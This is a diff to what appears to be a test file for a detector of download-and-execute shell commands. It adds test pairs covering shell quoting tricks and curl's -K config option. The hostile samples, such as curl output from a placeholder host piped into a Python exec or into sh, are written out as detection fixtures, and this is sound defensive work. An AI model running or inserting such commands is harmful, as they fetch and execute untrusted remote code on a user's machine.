@@ -298,6 +298,18 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             b'curl -s https://example.invalid/p | python3 -c "import sys;exec(sys.stdin.read())"\n',
             b"curl -s https://example.invalid/h | python3 -m json.tool\n",
         ),
+        # Adjacent quoted segments are one shell argument, so the exemption must cover all of it.
+        (
+            "script_download_execute",
+            b"curl -s https://example.invalid/p | python3 -c 'import sys;''exec(sys.stdin.read())'\n",
+            b"curl -s https://example.invalid/h | python3 -c 'import json,sys;print(json.load(sys.stdin))'\n",
+        ),
+        # An option can supply the target: curl -Kcfg reads the URL from a file.
+        (
+            "script_download_execute",
+            b"curl -Kcfg | sh\n",
+            b"The CI job is pinned, with no `curl -s | sh` anywhere.\n",
+        ),
         # Prose that names the idiom has no download target.
         (
             "script_download_execute",
